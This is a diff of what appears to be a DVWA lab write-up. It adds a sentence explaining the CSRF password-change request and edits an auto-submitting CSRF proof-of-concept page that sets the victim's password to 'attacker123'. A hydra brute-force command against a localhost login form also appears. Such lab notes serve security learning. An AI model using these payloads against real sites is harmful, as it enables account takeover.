@@ -148,7 +148,7 @@ hydra -l admin -P /usr/share/wordlists/rockyou.txt localhost http-post-form "/vu
 ```
 GET /vulnerabilities/csrf/?password_new=password&password_conf=password&Change=Change
 ```
-
+The password can be changed using the vuln request by modifying the parameters password_new and password_conf
 ### CSRF PoC
 ```html
 <html>
@@ -156,7 +156,7 @@ GET /vulnerabilities/csrf/?password_new=password&password_conf=password&Change=C
     <form action="http://localhost/vulnerabilities/csrf/" method="GET">
         <input type="hidden" name="password_new" value="attacker123">
         <input type="hidden" name="password_conf" value="attacker123">
-        <input type="hidden" name="Change" value="Change">
+        <input type="submit" name="Change" value="Change">
     </form>
     <script>document.forms[0].submit();</script>
 </body>
